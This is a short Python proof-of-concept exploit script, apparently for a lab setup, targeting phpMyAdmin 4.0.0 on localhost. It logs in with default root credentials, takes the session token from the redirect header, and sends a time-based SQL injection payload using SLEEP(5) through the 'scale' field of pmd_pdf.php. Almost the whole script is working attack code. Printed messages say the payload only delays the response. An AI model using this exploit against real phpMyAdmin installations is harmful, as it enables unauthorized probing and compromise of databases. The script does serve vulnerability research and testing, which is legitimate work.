#! /usr/bin/python3

import requests

def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))


pma_url = "http://localhost:8085/4.0.0/index.php"

auth = {'pma_username':'root', 'pma_password':'root'}
#proxy = {'http', 'http://127.0.0.1:8080'}
session = requests.Session()

# login to pma
r1 = session.get(url=pma_url, cookies= {})
r2 = session.post(url=pma_url, data=auth, cookies=r1.cookies, allow_redirects=False)
print("[*] Logged in to phpMyAdmin")

# GET the token
location = r2.headers['Location']
token_loc = location.find("token=")
token = location[token_loc+len("token="):]
print("[*] Retrieved the Token")


prRed("This is a timing-based SQLi attack -- The exploit only delays the response and no other damage")
prGreen("======In case of a failed attack -- the response is immediate=====\n\n\n\n\n")
# send the post request containing the time-based SQLi
exp_data = {'ajax_request':'true', 'ajax_page_request':'true', 'db':'code_coverage', 'pdf_page_number':'1','mode':'create_export','newpage':'testing','scale':'1 or 1 AND (SELECT 4387 FROM (SELECT(SLEEP(5)))ixHs)'}
r3 = session.post(url="http://localhost:8085/4.0.0/pmd_pdf.php?token="+token, data = exp_data, cookies = r2.cookies.get_dict())
print(r3.content)

